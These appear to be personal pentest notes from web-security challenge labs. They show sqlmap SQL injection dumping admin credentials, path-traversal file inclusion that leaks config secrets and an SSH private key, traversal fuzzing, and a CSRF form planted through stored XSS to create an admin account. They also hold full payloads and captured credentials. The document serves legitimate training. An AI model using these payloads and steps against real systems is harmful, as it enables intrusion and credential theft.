Cookie: PHPSESSID=d82d1b45b383e43d6dd53de569b0ee5a; XSRF-TOKEN=eyJpdiI6IlpRRnYwWFVmRThvQ3ZCVitZb2hWeWc9PSIsInZhbHVlIjoiWUdwQy9Kc3N5WmxtY0loaVloSThQbjY4OWpJVmljRS8xck9TMk1kMysrQWlySjNMVWJUc0ZxckVPRUp0dlpxSnM0MXpDZm1VaXlBWjJpOUs1L1lrRUdnU0ZUbzdGZlZaL1A1OWF2REpJNGxaZ0pWZlYxWktsaFBwUFplUEY2clgiLCJtYWMiOiIyNzQ3MzhjMmZmMmY0YTU4ZmIwMTAxY2U2NDZlMjg0ZWU1M2MxMzBkYTdmYzg3YTkwOGFmNDk2NjU1OTUyYTY4In0%3D; laravel_session=eyJpdiI6IjdqeU5EZlBVbFN3aHpZY3Y2eWt0UEE9PSIsInZhbHVlIjoiN29JMFlGS2lxZ0RSOG1XRW1UNWZtNWo5QW5Bb0JMVFMxVWFOUjYydzlMejI3MVl0bHNhb2c2TlE3UWxDUjB6aXN6alJaMXRzalNLb05iMDNsUHpSLzJ6SXI2TENpcE5MaDluVERyeXZCTENuUHRsU1VET2dvb1RhNUROTGpvNGMiLCJtYWMiOiI4NDk1MDg1YzBkYzg2NTUxN2Q0MDQzZDM1ZTllOTdlZThhMjNhZjE5YTZkOGIwNWUzZmY1ZmQzMDZiOGI3MzljIn0%3D
Connection: keep-alive



------WebKitFormBoundaryTRUOcxXGzadrReMb

Content-Disposition: form-data; name="_token"

27hoFiHGwgBmFVxPb9kfeImpIdo4HVzaxzxtDsZ5
------WebKitFormBoundaryTRUOcxXGzadrReMb
Content-Disposition: form-data; name="username"

jbug
------WebKitFormBoundaryTRUOcxXGzadrReMb
Content-Disposition: form-data; name="password"

jbug
------WebKitFormBoundaryTRUOcxXGzadrReMb
Content-Disposition: form-data; name="firstName"

jbug
------WebKitFormBoundaryTRUOcxXGzadrReMb
Content-Disposition: form-data; name="lastName"

jbug
------WebKitFormBoundaryTRUOcxXGzadrReMb
Content-Disposition: form-data; name="emailAddress"

jbug@gmail.com
------WebKitFormBoundaryTRUOcxXGzadrReMb

Content-Disposition: form-data; name="dType"

registerRequest
------WebKitFormBoundaryTRUOcxXGzadrReMb--

```
![[Pasted image 20241209214938.png]]
 SQLMAP testing
`auth_postreq.txt `
```http
POST /auth HTTP/1.1
Host: piano
Content-Length: 493
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://piano
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygoYcqGSiBvm5AX3T
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://piano/login
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=d82d1b45b383e43d6dd53de569b0ee5a; XSRF-TOKEN=eyJpdiI6IldHenVHS1dZL2ZzUDRaNVZzejMxTWc9PSIsInZhbHVlIjoiTWpLU2NsS0hMQTVtd2licjlOMHQ1d0l3SVpLanhuV21YRzBYQVh1QWY2aitwcjNKbjVPQkhRVGhVN3VONENubnl0VTU4Rzlma29QZFluWGkwV2pRblFRVHhCU1lzTjdMd3lkV0piMG5TT3h6cEJselM2YlN4end4bTZ6S1NJZW0iLCJtYWMiOiI4ZmI1MmJjY2U2ZjAxYTBkYzFkNjUzMTE1NTVlZTdjMTQwMTFhNmY5YjZjYmExZDcwNDVmM2M0YjQ1ZDk5NWMwIn0%3D; laravel_session=eyJpdiI6InJVenUzNksxUHFLK0hNRFZSMHVpNnc9PSIsInZhbHVlIjoiOWRvOGZjZmJDaWE2RnZ3VUtQdSsrcm10WXkrakNTNmRleThUeVBsakNYdXFKZFdTLy85WHZCb0dvR0tnckYwNUlWMmZJM05Jckt0cW9ST1JDK2ZibWNhNVB0RjgreEt2YTZtY0UyTm1LajF5ZjVEQW41dzA4RFpKUDgxMm8zMnAiLCJtYWMiOiI2OWM4YmNmMmY4N2UzMjU4OGY0M2ZmOTZlNWQwZWIwNjUwNDBlZTRmNGQ3YTdhNGM2YmYxZTI0ZGY1ZTVkZDRmIn0%3D

Connection: keep-alive

------WebKitFormBoundarygoYcqGSiBvm5AX3T
Content-Disposition: form-data; name="_token"

27hoFiHGwgBmFVxPb9kfeImpIdo4HVzaxzxtDsZ5
------WebKitFormBoundarygoYcqGSiBvm5AX3T
Content-Disposition: form-data; name="username"

' OR 1=1 --
------WebKitFormBoundarygoYcqGSiBvm5AX3T
Content-Disposition: form-data; name="password"

' OR 1=1 --
------WebKitFormBoundarygoYcqGSiBvm5AX3T
Content-Disposition: form-data; name="dType"

loginRequest
------WebKitFormBoundarygoYcqGSiBvm5AX3T--
```

if unsure what field to test against - typically takes a very long time, not recommended - faster to test each individual parameter
```sql
sqlmap -r auth_postreq.txt --batch --risk=3 --level=5
```
if want to test a specific parameter, in this case testing the `username` parameter
```sql
sqlmap -r request.txt -p username --batch --risk=3 --level=5 -- flush-session
```
putting it in action
- here we find `boolean based blind injection` & `time based ` & `error based`
```sql
┌──(root💀gobots)-[10Dec2024 04:17:15]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]                                                  
└─# sqlmap -r post_req.txt -p username --batch --risk=3 --level=3 --flush-session                                                                                                                           
        ___                                                                                                                              
       __H__                                                                                                                            
 ___ ___[)]_____ ___ ___  {1.8.5#stable}                                                                                              
|_ -| . [']     | .'| . |                                                                                                           
|___|_  [.]_|_|_|__,|  _|                                                                                                                 
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers as
sume no liability and are not responsible for any misuse or damage caused by this program                                                                                                                  
[*] starting @ 04:17:30 /2024-12-10/                                                                                                                                                                   
[04:17:30] [INFO] parsing HTTP request from 'post_req.txt'                                                                                                                                                  
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y                                                              
[04:17:30] [INFO] flushing session file                                                                                                   
[04:17:30] [INFO] testing connection to the target URL                                                                                    
[04:17:30] [INFO] checking if the target is protected by some kind of WAF/IPS                                                             
[04:17:30] [INFO] testing if the target URL content is stable                                                                             
[04:17:31] [INFO] target URL content is stable                                                                                            
[04:17:31] [INFO] heuristic (basic) test shows that (custom) POST parameter 'MULTIPART username' might be injectable (possible DBMS: 'MySQL')                                                          
[04:17:31] [INFO] heuristic (XSS) test shows that (custom) POST parameter 'MULTIPART username' might be vulnerable to cross-site scripting (XSS) attacks                                               
[04:17:31] [INFO] testing for SQL injection on (custom) POST parameter 'MULTIPART username'                                               
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y                          
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] Y                         
[04:17:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                              
[04:17:32] [WARNING] reflective value(s) found and filtering out                                                                          
[04:17:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'                                                              
[04:17:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'                                                         
[04:17:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'                                         
[04:17:46] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --not-string="row")              
[04:17:46] [INFO] testing 'Generic inline queries'                                                                                        
[04:17:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                   
[04:17:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:17:47] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:17:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:17:47] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:17:47] [INFO] (custom) POST parameter 'MULTIPART username' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[04:17:47] [INFO] testing 'MySQL inline queries'
[04:17:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:17:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:17:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:17:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:17:47] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:17:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:17:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:17:58] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:17:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:17:58] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:17:59] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injecti
on technique test
[04:17:59] [INFO] target URL appears to have 6 columns in query
[04:18:00] [INFO] (custom) POST parameter 'MULTIPART username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter 'MULTIPART username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 168 HTTP(s) requests:
---
Parameter: MULTIPART username ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: ------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="_token"

27hoFiHGwgBmFVxPb9kfeImpIdo4HVzaxzxtDsZ5
------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="username"

test' AND 7560=(SELECT (CASE WHEN (7560=7560) THEN 7560 ELSE (SELECT 2530 UNION SELECT 9167) END))-- - 
------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="password"

test
------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="dType"

loginRequest
------WebKitFormBoundary8LPrCAt0EnCfI1Cc--

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: ------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="_token"

27hoFiHGwgBmFVxPb9kfeImpIdo4HVzaxzxtDsZ5
------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="username"

test' AND GTID_SUBSET(CONCAT(0x716a706a71,(SELECT (ELT(6980=6980,1))),0x71716a7671),6980)-- DRlX
------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="password"

test
------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="dType"

loginRequest
------WebKitFormBoundary8LPrCAt0EnCfI1Cc--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="_token"

27hoFiHGwgBmFVxPb9kfeImpIdo4HVzaxzxtDsZ5
------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="username"

test' AND (SELECT 5271 FROM (SELECT(SLEEP(5)))fiSS)-- ivZk
------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="password"

test
------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="dType"

loginRequest
------WebKitFormBoundary8LPrCAt0EnCfI1Cc--

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: ------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="_token"

27hoFiHGwgBmFVxPb9kfeImpIdo4HVzaxzxtDsZ5
------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="username"

test' UNION ALL SELECT NULL,CONCAT(0x716a706a71,0x6f486e4e646e72584577445a434b55615849617a724b41636374546c7874715a48754b68756e6950,0x71716a7671),NULL,NULL,NULL,NULL-- -
------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="password"

test
------WebKitFormBoundary8LPrCAt0EnCfI1Cc
Content-Disposition: form-data; name="dType"

loginRequest
------WebKitFormBoundary8LPrCAt0EnCfI1Cc--
---
[04:18:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 7.3.33, Apache 2.4.52
back-end DBMS: MySQL >= 5.6
[04:18:00] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/piano'
[04:18:00] [WARNING] your sqlmap version is outdated
```
now we test to identify the databases with the `--dbs` option, now we have the `dbs` `piano_protocol` we can look for the `tables`
```bash
──(root💀gobots)-[25Nov2024 17:13:47]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]                                             
└─# sqlmap -r post_req.txt -p username --dbs --batch      
[04:30:33] [INFO] the back-end DBMS is MySQL       
web server operating system: Linux Debian          
web application technology: Apache 2.4.52, PHP 7.3.33                                                 
back-end DBMS: MySQL >= 5.6                        
[04:30:33] [INFO] fetching database names          
available databases [6]:                           
[*] information_schema                             
[*] mysql                                          
[*] performance_schema                             
[*] piano_protocol                                 
[*] sqli                                           
[*] sys              
```
now we test to find the `--tables` in the `piano_protocol` database
```bash
┌──(root💀gobots)-[10Dec2024 04:30:33]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]               
└─# sqlmap -r post_req.txt -p username -D piano_protocol --tables --batch    
[04:31:16] [INFO] fetching tables for database: 'piano_protocol'                                      
Database: piano_protocol                           
[2 tables]                                         
+------------------+                               
| contact_requests |                               
| users            |                               
+------------------+                               

[04:31:16] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/piano'    
[04:31:16] [WARNING] your sqlmap version is outdated           
```
now we test to find the `--columns` in the `--tables` in the `piano_protocol` database
```bash
┌──(root💀gobots)-[10Dec2024 04:31:16]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]               
└─# sqlmap -r post_req.txt -p username -D piano_protocol -T users --columns --batch
[04:31:49] [INFO] fetching columns for table 'users' in database 'piano_protocol'                     
Database: piano_protocol                           
Table: users                                       
[6 columns]                                        
+-----------+---------------+                      
| Column    | Type          |                      
+-----------+---------------+                      
| email     | varchar(255)  |                      
| firstname | varchar(255)  |                      
| id        | int(11)       |                      
| lastname  | varchar(255)  |                      
| password  | varchar(255)  |                      
| username  | varchar(3000) |                      
+-----------+---------------+           
```
now since we have the `--columns`, `--tables,` & `--dbs` we can now dump the column
```bash
┌──(root💀gobots)-[10Dec2024 04:31:49]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]               
└─# sqlmap -r post_req.txt -p username -D piano_protocol -T users -C username,password --dump --batch   
back-end DBMS: MySQL >= 5.6
back-end DBMS: MySQL >= 5.6
[04:51:23] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'piano_protocol'
Database: piano_protocol
Table: users
[1 entry]
+----------+-------------------+
| username | password          |
+----------+-------------------+
| admin    | djj28hah*dhk2hd1% |
+----------+-------------------+


[04:32:09] [INFO] table 'piano_protocol.users' dumped to CSV file '/root/.local/share/sqlmap/output/piano/dump/piano_protocol/users.csv'
[04:32:09] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/piano'
[04:32:09] [WARNING] your sqlmap version is outdated

```
credentials saved here
![[Pasted image 20241209234218.png]]
able to login at `http://piano/siteadmin`
![[Pasted image 20241209235247.png]]

##### Local File Inclusion (LFI)

###### Asio (WINDOWS)
when browsing to `/specials` we get the same error
![[Pasted image 20250102165644.png]]
but when we look in `burpsuite` we are able to see `winter.html` being referenced - possibly for the menu, lets try seeing other files
![[Pasted image 20250102165738.png]]
testing for `LFI` we come up with looking for the `/etc/passwd` equivalent which is the `window/win.ini` file by utilizing this request
```http
GET /specials?menu=../../../../../../../../../../windows/win.ini HTTP/1.1
```
the burp request shows that we have command execution
![[Pasted image 20250102173514.png]]
now because we know that it is a `SPRING BOOT` server lets do research to file potential file paths

got a potential `/config` path
![[Pasted image 20250102173626.png]]
with ome file names
![[Pasted image 20250102173703.png]]
testing
```http
../../../../../../../../../../config/application.properties
../../../../../../../../../../config/application.yml
```
because we dont know how far back from the working directory that the `config` file is we're going to have to `FUZZ` do to them not being found
![[Pasted image 20250102174111.png]]


 Fuzzing
going to make `paths.txt` and `files.txt`

`paths.txt`
```bash
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
../../../../../../../../../
../../../../../../../../../../
../../../../../../../../../../../
```

`files.txt`
- found config files by googling `Spring Boot server config`
```bash
application.properties
application.yml
config/application.properties
config/application.yml
```

`wfuzz`
- found the path with `../`
```bash
┌──(root💀gobots)-[02Jan2025 22:45:05]-[/home/…/SUT/OSWA/challenge_labs/asio]
└─# wfuzz -w paths.txt -w files.txt --hh 0 http://asio/specials?menu=FUZZFUZ2Z
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://asio/specials?menu=FUZZFUZ2Z
Total requests: 40

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                    
=====================================================================

000000003:   200        18 L     21 W       523 Ch      "../ - config/application.properties"                                                                                                      

Total time: 0
Processed Requests: 40
Filtered Requests: 39
Requests/sec.: 0
```
now browsing to the reques tin `BURP` we are able to grab the `admin.portal.key` - 06c82a1f-892d-48de-8682-67c0c3a096b4
![[Pasted image 20250102174819.png]]
we can also do the same thing using `curl`

```bash
┌──(root💀gobots)-[02Jan2025 22:45:27]-[/home/…/SUT/OSWA/challenge_labs/asio]
└─# curl http://asio/specials?menu=../config/application.properties
# STRIGI'S PIZZA 
server.port=80
server.address=0.0.0.0
spring.web.resources.cache.cachecontrol.max-age=1d
# LOGGING
logging.file.name=logs/strigi.log
logging.level.root=WARN

# DATABASE
spring.datasource.driver-class-name=com.microsoft.sqlserver.jdbc.SQLServerDriver
spring.datasource.url=jdbc:sqlserver://127.0.0.1;databaseName=strigi

spring.datasource.username=sa
spring.datasource.password=MqFuFWUGNrR3P4bJ

spring.datasource.hikari.max-lifetime=30

# ADMIN PORTAL
admin.portal.key=06c82a1f-892d-48de-8682-67c0c3a096b4        
```
now browse to `/login` and attempt to login
![[Pasted image 20250102174957.png]]
profit
![[Pasted image 20250102175018.png]]
###### Piano Protocol (LINUX)

```bash
http://piano_protocol/siteadmin/dev
```
![[Pasted image 20241125132521.png]]
we know we have to use `SSH`
![[Pasted image 20241125132806.png]]
selecting the `PIANO` from the inventory on the `siteadmin/dev` page and hitting check inventory displays a `LFI` method
![[Pasted image 20241125135713.png]]
checking for `/etc/passwd` we get results
![[Pasted image 20241125135855.png]]
knowing that `ssh` is being utilized on port `2222` we can focus on getting an `ssh id_rsa` key
we get the `ssh` key
![[Pasted image 20241125140009.png]]
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
save file to `admin_rsa` change permissions to `chmod 600` and profit `proof.txt`

```bash
┌──(root💀gobots)-[25Nov2024 18:44:37]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]
└─# vim admin_rsa     
┌──(root💀gobots)-[25Nov2024 18:44:48]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]
└─# ssh -p 2222 -i admin_rsa admin@192.168.240.126
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'admin_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "admin_rsa": bad permissions
(admin@192.168.240.126) Password: 

          
┌──(root💀gobots)-[25Nov2024 18:45:13]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]
└─# chmod 600 admin_rsa  

┌──(root💀gobots)-[25Nov2024 18:45:36]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]
└─# ssh -p 2222 -i admin_rsa admin@192.168.240.126
Linux 4640f8a33883 5.15.0-75-generic #82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
admin@4640f8a33883:~$ whoami
admin
admin@4640f8a33883:~$ ls
proof.txt
admin@4640f8a33883:~$ cat proof.txt 
bedf234a5324136b019859e0c79a635a
admin@4640f8a33883:~$ 

```
##### Cross-Site Request Forgery (CSRF)
###### 1. **XSS (Cross-Site Scripting):**

- XSS is a vulnerability where malicious scripts are injected into otherwise trusted websites.
- It typically occurs when user input is not properly sanitized and is rendered directly on a web page.
- XSS attacks can be used to steal cookies, session tokens, or perform actions on behalf of the victim.
###### 2. **CSRF (Cross-Site Request Forgery):**

- CSRF is a different kind of attack where a malicious website tricks a user into performing unintended actions on another site where they are authenticated (e.g., transferring money or changing account settings).
- CSRF does not necessarily rely on XSS to occur. It exploits the trust a website has in the user's browser.
###### 3. **Relationship Between XSS and CSRF:**

- XSS can sometimes facilitate CSRF attacks by allowing an attacker to inject scripts that forge requests on behalf of the victim.
- For example, an XSS payload might generate unauthorized actions that mimic legitimate requests, bypassing certain protections.
###### Home / Book Flight - XSS
`Home / Book Flight` has multiple fields we can test for `XSS`
![[Pasted image 20241210212312.png]]
when attempting to fill out with default `XSS` payload get an error for `Depart Code` and `Destination Code`
![[Pasted image 20241210212528.png]]
this is what a corect payload looks like  `<h1>offsec</h1>`
![[Pasted image 20241210212606.png]]
at the bottom right next to book flight we see that an `admin` will review this
![[Pasted image 20241210212751.png]]
after hitting book flight we get this message 
![[Pasted image 20241210212632.png]]
after navigating to `My Flights` we are able to see that this is saved and waiting for review. 
- we can see that the `Message for Pilot` field wasnt santized as we can still see the `<h1>` this means that it possibly is vulnerable to `XSS`
![[Pasted image 20241210213136.png]]
because we know that `CSRF` is leveraging `XSS` to submit a payload that is executed by the `ADMIN` and the `ADMIN` language is being utilized here we know that this is the way forward

##### CSRF Payload Generation
once the `fields` required are determined - in this case at the `/loginLogout` field send to `Generate CSRF PoC` - this is very common for `CSRF` due to two things being required for `CSRF`
- Some sort of `Admin` execution capability or reference on the website talking about executing it
- `XSS` vulnerable parameter

![[Pasted image 20241211213219.png]]
this generates a payload that creates a `Submit Request`  
- this payload doesn't work because the context, from this context we would be reaching out from an external website `http://screamin_firehawk/loginLogout`
- the `100` is also what delineates a admin user creation
![[Pasted image 20241211214810.png]]
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://screamin_firehawk/loginLogout" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="&#95;token" value="uQzxxdaDIx4I06JV6xCM4ZFiw3kZ6MEmS3AMFdyq" />
      <input type="hidden" name="username" value="testadmin" />
      <input type="hidden" name="password" value="testadmin" />
      <input type="hidden" name="firstName" value="testadmin" />
      <input type="hidden" name="lastName" value="testadmin" />
      <input type="hidden" name="email" value="testadmin&#64;local&#46;com" />
      <input type="hidden" name="dType" value="isRegister" />
      <input type="hidden" name="type" value="100" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
in order to get this to work properly we need to change the context to `/login/Logout` this makes it so from the `Admin`'s perspective it executes the payload to create another `Admin`.
![[Pasted image 20241211220827.png]]
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="/loginLogout" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="&#95;token" value="uQzxxdaDIx4I06JV6xCM4ZFiw3kZ6MEmS3AMFdyq" />
      <input type="hidden" name="username" value="testadmin" />
      <input type="hidden" name="password" value="testadmin" />
      <input type="hidden" name="firstName" value="testadmin" />
      <input type="hidden" name="lastName" value="testadmin" />
      <input type="hidden" name="email" value="testadmin&#64;local&#46;com" />
      <input type="hidden" name="dType" value="isRegister" />
      <input type="hidden" name="type" value="100" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
add it straight to the comment field and hit submit
